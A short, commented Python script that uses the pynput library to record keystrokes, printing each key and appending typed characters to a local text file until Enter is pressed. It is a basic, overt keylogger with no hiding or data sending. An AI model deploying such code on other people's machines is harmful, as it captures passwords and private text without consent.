# Import the necessary module
from pynput import keyboard

# Define a function to handle key presses
def keyPressed(key):
    print(str(key))  # Print the pressed key

    # Open a file in append mode to log the keys
    with open("file.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)  # Write the pressed character to the file
        except:
            print("Error!!!")  # Handle any exceptions (e.g., non-character keys)

# Main execution starts here
if __name__ == "__main__":
    # Create a listener for key presses
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()

    # Wait for user input (you can replace this with any other logic)
    input("Press Enter to exit...")  # This line waits for user input

# End of the program
